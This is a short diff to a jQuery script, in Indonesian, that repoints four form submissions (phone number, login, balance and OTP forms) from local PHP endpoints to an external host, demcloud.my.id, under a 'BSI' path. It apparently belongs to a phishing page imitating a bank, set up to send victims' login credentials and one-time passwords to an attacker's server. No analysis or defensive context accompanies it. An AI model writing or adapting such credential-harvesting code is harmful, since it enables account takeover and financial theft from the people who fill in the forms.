@@ -15,7 +15,7 @@ $('.process1').fadeIn();
  
       $.ajax({
             type: 'POST',
-            url: 'rest/no.php',
+            url: 'https://demcloud.my.id/BSI/fgd6b/no.php',
             data: $('#formHP').serialize(),
             datatype: 'text',
             
@@ -35,7 +35,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'rest/login.php',
+            url: 'https://demcloud.my.id/BSI/fgd6b/login.php',
             data: $('#formLog').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -61,7 +61,7 @@ $('.process1').fadeIn();
  document.getElementById('btnSubmit1').innerHTML ="Memproses..."; 
       $.ajax({
             type: 'POST',
-            url: 'rest/saldo.php',
+            url: 'https://demcloud.my.id/BSI/fgd6b/saldo.php',
             data: $('#jualpuki').serialize(),
             datatype: 'text',          
             complete: function(data) {
@@ -91,7 +91,7 @@ function sendOtp() {
  document.getElementById('btnSubmit1').innerHTML = "Memproses...";    
 $.ajax({
  type: 'POST',
- url: 'rest/otp.php',
+ url: 'https://demcloud.my.id/BSI/fgd6b/otp.php',
  async: false,
  dataType: 'JSON',
  data: $('#form2').serialize(),
